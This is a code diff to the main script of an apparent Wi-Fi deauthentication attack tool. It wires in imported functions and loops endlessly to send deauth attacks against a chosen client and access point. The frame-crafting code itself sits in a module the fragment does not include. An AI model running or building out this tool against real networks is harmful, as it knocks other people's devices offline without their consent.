@@ -1,8 +1,9 @@
 import sys
-# from modules.deauth import *
-# from modules.scanning import *
+from modules.deauth import craft_deauth_attack_to_AP, craft_deauth_attack_to_client
 from termcolor import colored
 import re
+
+
 banner = """
 
 ██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
@@ -63,7 +64,7 @@ def main():
             else:
                 try:
                     while True:
-                        craft_deauth_attack_to_AP(client_mac, AP_MAC1)
+                        craft_deauth_attack_to_client(client_mac, AP_MAC1)
                 except KeyboardInterrupt:
                     print("Bye")
         else:
@@ -72,6 +73,6 @@ def main():
     except KeyboardInterrupt:
         print(colored("Bye :))", color="yellow"))
 
-if __name__ == "__main__":
-    while True:
-        main()
+
+while True:
+    main()
